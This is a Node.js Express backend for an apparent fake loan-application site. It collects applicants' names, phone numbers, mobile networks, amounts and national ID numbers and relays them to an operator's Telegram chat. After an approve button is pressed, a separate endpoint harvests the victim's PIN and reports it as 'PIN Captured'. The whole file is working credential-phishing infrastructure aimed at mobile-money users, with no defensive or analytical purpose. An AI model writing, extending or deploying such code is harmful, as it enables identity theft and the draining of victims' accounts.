const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV VARIABLES (set in Railway)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("Missing fields");
  }

  // Save phone for later (simple method)
  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}

-------------------------
⚙️ Action Required:
`;

  try {
    // Send with buttons
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve_${phone}` },
            { text: "❌ Decline", callback_data: `decline_${phone}` }
          ]
        ]
      }
    });

    res.sendStatus(200);
  } catch (err) {
    console.log(err.response?.data || err.message);
    res.status(500).send("Telegram failed");
  }
});

// ================= PIN PAGE VISIT =================
app.post("/pin-step", async (req, res) => {
  const { phone } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `📍 USER REACHED PIN STEP\n📱 ${phone}`
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

// ================= PIN SUBMIT =================
app.post("/pin", async (req, res) => {
  const { phone, pin } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `
🔐 PIN RECEIVED

📱 Phone: ${phone}
🔑 PIN: ${pin}

✅ Status: PIN Captured
`
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

// ================= WEBHOOK =================
app.post("/webhook", (req, res) => {
  const data = req.body;

  if (data.callback_query) {
    const query = data.callback_query;
    const action = query.data;

    let text = "";

    if (action.startsWith("approve")) {
      text = "✅ Approved\n➡️ Next: PIN Page";
    } else if (action.startsWith("decline")) {
      text = "❌ Declined";
    }

    // Respond back in Telegram
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: text
    });
  }

  res.sendStatus(200);
});

// ================= START SERVER =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
